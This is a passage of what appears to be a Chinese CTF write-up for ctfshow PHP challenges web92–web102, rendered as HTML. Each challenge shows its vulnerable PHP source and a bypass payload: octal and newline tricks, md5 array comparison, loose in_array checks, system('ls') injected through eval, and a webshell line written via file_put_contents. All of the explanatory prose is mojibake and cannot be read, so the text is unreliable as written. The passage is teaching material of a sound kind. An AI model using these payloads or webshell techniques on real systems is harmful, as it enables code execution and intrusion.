</p><p>imæ¨¡å¼æ˜¯å¯ä»¥åŒ¹é…å¾ˆå¤šè¡Œ  iæ¨¡å¼åªèƒ½åŒ¹é…ä¸€è¡Œ</p><p>%0aæ¢è¡Œï¼Œç›¸å½“äºenter</p><p>Payloadï¼š</p><blockquote><p>cmd&#x3D;%0aphp</p><p>cmd&#x3D;php%0a1</p></blockquote><h4 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h4><p>å’Œ90å¾ˆåƒä¸è¿‡ç¬¬ä¸€ä¸ªæ¯”è¾ƒå¹¶ä¸æ˜¯å¼ºç±»å‹ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨ç®€å•çš„4476aæˆ–è€…4476.æ¥ç»•è¿‡ï¼Œå…¶ä»–éƒ½å¯ä»¥</p><h4 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h4><p>è¿‡æ»¤äº†æ‰€æœ‰å­—æ¯ä½†æ˜¯å¯ä»¥ä½¿ç”¨8è¿›åˆ¶</p><p>Payload: <code>num=010574</code></p><h4 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™æ®µä»£ç ä¸­çš„ if(!strpos($num, â€œ0â€)){} è¡Œä½¿ç”¨äº† PHP ä¸­çš„ strpos() å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯åœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ç‰¹å®šå­å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚é€æ­¥è§£é‡Šè¿™æ®µä»£ç çš„é€»è¾‘ï¼š 1.strpos($num, â€œ0â€)ï¼šè¿™éƒ¨åˆ†ä»£ç è°ƒç”¨äº† strpos() å‡½æ•°ï¼Œç”¨äºåœ¨ $num å˜é‡ä¸­æŸ¥æ‰¾å­—ç¬¦ â€œ0â€ ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚å¦‚æœæ‰¾åˆ°äº†ï¼Œåˆ™è¿”å›è¯¥ä½ç½®çš„ç´¢å¼•å€¼ï¼ˆç´¢å¼•å€¼ä»0å¼€å§‹ï¼‰ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™è¿”å› falseã€‚</p><p>æ‰€ä»¥å¼€å§‹ä¸èƒ½æœ‰0ï¼Œä½†æ˜¯å¿…é¡»å¾—æœ‰0ï¼Œè€Œä¸”åˆšå¥½ç¬¬ä¸€ä¸ªæ¢æˆäº†å¼ºæ¯”è¾ƒï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨4476.0</p><p>çœ‹å…¶ä»–wpæ˜¯åœ¨å‰é¢åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œä¹Ÿå°±æ˜¯%20ä¹Ÿå¯ä»¥ä½¿ç”¨%0a</p><h4 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h4><p>ç¬¬ä¸€ä¸ªæ”¹å›å»äº†ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨4476.0å…¶ä»–Payloadå¯ä»¥</p><h4 id="web96-ç»•è¿‡"><a href="#web96-ç»•è¿‡" class="headerlink" title="web96(.&#x2F;ç»•è¿‡)"></a>web96(.&#x2F;ç»•è¿‡)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åœ¨Linuxä¸‹.&#x2F;è¡¨ç¤ºå½“å‰ç›®å½•</p><p>Payload:<code>u=./flag.php</code></p><h4 id="web97-md5æ•°ç»„ç»•è¿‡"><a href="#web97-md5æ•°ç»„ç»•è¿‡" class="headerlink" title="web97(md5æ•°ç»„ç»•è¿‡)"></a>web97(md5æ•°ç»„ç»•è¿‡)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> </code></pre><p>è¿™ä¸€é“é¢˜æ¶‰åŠåˆ°äº†å¼ºæ¯”è¾ƒçš„md5ç±»å‹ï¼Œä»ä»£ç æˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œè¦æ±‚aã€bä¸¤ä¸ªå€¼ä¸ä¸€æ ·ä½†æ˜¯éœ€è¦è¿™ä¸¤ä¸ªå€¼å¾—md5å€¼ä¸€æ ·ï¼Œå› æ­¤å¼ºæ¯”è¾ƒç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨md5å‡½æ•°å¤„ç†æ•°ç»„ç±»å‹ä¼šè¿”å›falseçš„ç‰¹æ€§ï¼Œä»è€Œåˆ©ç”¨false&#x3D;falseæ¥ç»•è¿‡ã€‚</p><p><a href="https://www.freebuf.com/articles/web/321300.html">CTFçŸ¥è¯†ç‚¹ï¼š å…³äºPHPè¿ç®—ç¬¦&#x3D;&#x3D;&#x3D; ä¸&#x3D;&#x3D;çš„æ€»ç»“</a></p><h4 id="web98-ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€-å¼•ç”¨"><a href="#web98-ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€-å¼•ç”¨" class="headerlink" title="web98(ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€(å¼•ç”¨) )"></a>web98(ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€(å¼•ç”¨) )</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>çœ‹å®Œä¸€å¤´é›¾æ°´</p><p><a href="https://www.php.cn/php-notebook-172859.html">phpå‡½æ•°çš„ä¼ å€¼ä¸ä¼ å€(å¼•ç”¨)è¯¦è§£</a></p><p>è€ƒç‚¹æ˜¯PHPé‡Œé¢çš„ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€(å¼•ç”¨) ä¼ å€(å¼•ç”¨)æœ‰ç‚¹åƒcè¯­è¨€é‡Œé¢çš„åœ°å€ æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸€ä¸‹ä»£ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">;</span><span class="token comment">//åªè¦æœ‰è¾“å…¥çš„getå‚æ•°å°±å°†getæ–¹æ³•æ”¹å˜ä¸ºpostæ–¹æ³•(ä¿®æ”¹äº†getæ–¹æ³•çš„åœ°å€)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span></span></code></pre><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ GETä¸€ä¸ª?1(å› ä¸ºGETä¼ å€¼è°ƒç”¨äº†POSTï¼Œæ‰€ä»¥æ— æ‰€è°“) åŠ  POSTä¸€ä¸ªHTTP_FLAG&#x3D;flag </p><h4 id="web99-in-array"><a href="#web99-in-array" class="headerlink" title="web99(in_array)"></a>web99(in_array)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è®¾ç½®ä¸ºæ•°ç»„</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å‘æ•°ç»„é‡Œé¢æ’å…¥éšæœºæ•°</span><span class="token punctuation">&#125;</span> i<span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//in_array()å‡½æ•°æœ‰æ¼æ´ æ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•° å°±å¯ä»¥å½¢æˆè‡ªåŠ¨è½¬æ¢eg:n=1.phpè‡ªåŠ¨è½¬æ¢ä¸º1</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å†™å…¥1.phpæ–‡ä»¶ å†…å®¹æ˜¯&lt;?php system($_POST[1]);</span><span class="token delimiter important">?></span></span>&#125;?></code></pre><p>array_pushâ€”â€”å¾€æ•°ç»„å°¾éƒ¨æ’å…¥å…ƒç´ <br>rand(1,$i)â€”â€”éšæœºç”Ÿæˆ1-877ä¹‹é—´çš„æ•°<br>&#x2F;&#x2F;æ‰€ä»¥array_push($allow, rand(1,$i))å°±æ˜¯å¾€æ•°ç»„ä¸­æ’å…¥1-877ä¹‹é—´çš„æ•°å­—<br>in_arrayâ€”â€”æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼:<br>in_array(search,array,type)<br>searchä¸ºæŒ‡å®šæœç´¢çš„å€¼<br>arrayä¸ºæŒ‡å®šæ£€ç´¢çš„æ•°ç»„<br>typeä¸ºTRUEåˆ™ å‡½æ•°è¿˜ä¼šæ£€æŸ¥ searchçš„ç±»å‹æ˜¯å¦å’Œ arrayä¸­çš„ç›¸åŒ</p><p>ç»¼ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ•°ç»„ä¸­çš„å€¼æ˜¯intï¼Œè€Œåœ¨å¼±ç±»å‹ä¸­å½“phpå­—ç¬¦ä¸²å’Œintæ¯”è¾ƒæ—¶,å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆintï¼Œæ‰€ä»¥ å­—ç¬¦ä¸²ä¸­æ•°å­—åé¢çš„å­—ç¬¦ä¸²ä¼šè¢«å¿½ç•¥ã€‚é¢˜ç›®ä¸­çš„in_arrayæ²¡æœ‰è®¾ç½®type,æˆ‘ä»¬å¯ä»¥è¾“å…¥å­—ç¬¦ä¸²5.php(æ­¤å¤„æ•°å­—éšæ„ï¼Œåªè¦åœ¨rand(1,0x36d)ä¹‹é—´å³å¯)ï¼Œè½¬æ¢ä¹‹åä¹Ÿå°±æ˜¯5</p><p>çœ‹åˆ°file_put_contentsï¼Œå¯ä»¥ä½¿ç”¨phpä¼ªåè®®</p><h4 id="web100-is-numeric-è¿ç®—ç¬¦ä¼˜å…ˆçº§"><a href="#web100-is-numeric-è¿ç®—ç¬¦ä¼˜å…ˆçº§" class="headerlink" title="web100(is_numeric è¿ç®—ç¬¦ä¼˜å…ˆçº§)"></a>web100(is_numeric è¿ç®—ç¬¦ä¼˜å…ˆçº§)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// v2ä¸èƒ½æœ‰;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// v3å¿…é¡»æœ‰;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¿ç®—ç¬¦ä¼˜å…ˆçº§ï¼š**&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or**</p><p><strong>is_numeric()</strong> å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚</p><p>æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSE</p><p><strong>var_dump()<strong>å‡½æ•°å¯ä»¥è¾“å‡ºå¤šä¸ªå€¼ã€‚</strong>print_r</strong>ä¹Ÿå¯ä»¥</p><p><strong>&#x3D;<strong>çš„è¿ç®—ç¬¦æ¯”</strong>and</strong>é«˜</p><p>å¯¹äºv0çš„å€¼åªéœ€è¦çœ‹v1å°±å¯ä»¥v2,v3æ˜¯å¹²æ‰°</p><p>æ‰€ä»¥v1è¾“å…¥æ•°å­—</p><p>Payload:</p><blockquote><p>?v1&#x3D;11&amp;v2&#x3D;var_dump($ctfshow)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p><p>?v1&#x3D;1&amp;v2&#x3D;system(â€˜lsâ€™)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p></blockquote><p>æœ€åflag<code>0x2d</code>è¦è½¬åŒ–ä¸º<code>-</code></p><h4 id="web101-åå°„ç±»"><a href="#web101-åå°„ç±»" class="headerlink" title="web101(åå°„ç±»)"></a>web101(åå°„ç±»)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ¶‰åŠåˆ°ç±»ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ ReflectionClass å»ºç«‹åå°„ç±»ã€‚</p><p>new ReflectionClass($class) å¯ä»¥è·å¾—ç±»çš„åå°„å¯¹è±¡ï¼ˆåŒ…å«å…ƒæ•°æ®ä¿¡æ¯ï¼‰ã€‚</p><p>å…ƒæ•°æ®å¯¹è±¡ï¼ˆåŒ…å«classçš„æ‰€æœ‰å±æ€§&#x2F;æ–¹æ³•çš„å…ƒæ•°æ®ä¿¡æ¯ï¼‰ã€‚</p><p>payloadï¼šv1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p><p>flagä¸­æœ‰äº›å­—ç¬¦ç»è¿‡ACSIIç å˜æ¢ï¼Œå¥½åƒè¿˜å°‘äº†ä¸€ä½ï¼Œçˆ†ç ´å³å¯</p><h4 id="web102-substr-call-user-func"><a href="#web102-substr-call-user-func" class="headerlink" title="web102(substr call_user_func)"></a>web102(substr call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// æˆªå»äº†å‰ä¸¤ä¸ªå­—ç¬¦</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>**substr() **:å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</p><p>**call_user_func()**ï¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ä½¿ç”¨ï¼Œåé¢çš„å‚æ•°æ˜¯è¿™ä¸ªå‡½æ•°çš„å‚æ•°ã€‚è¿”å›è°ƒç”¨å‡½æ•°çš„è¿”å›å€¼ã€‚å…¶å®å°±æ˜¯ä¸€ç§ç‰¹æ®Šçš„è°ƒç”¨å‡½æ•°çš„æ–¹å¼ã€‚</p><p><strong>php5</strong>ä¸‹is_numericå¯è¯†åˆ«16è¿›åˆ¶ï¼Œå¦‚0x2eï¼Œç„¶åè°ƒç”¨hex2binè½¬æˆå­—ç¬¦ä¸²å†™å…¥æœ¨é©¬ï¼Œä½†é¢˜ç›®ç¯å¢ƒæ²¡é…å¥½ï¼Œæ˜¯<strong>php7</strong>,æ‰€ä»¥è¦å¦æ¢æ–¹æ³•ã€‚<br>ç”¨ä¼ªåè®®å†™å…¥ï¼Œæ‰€ä»¥éœ€è¦base64ç¼–ç 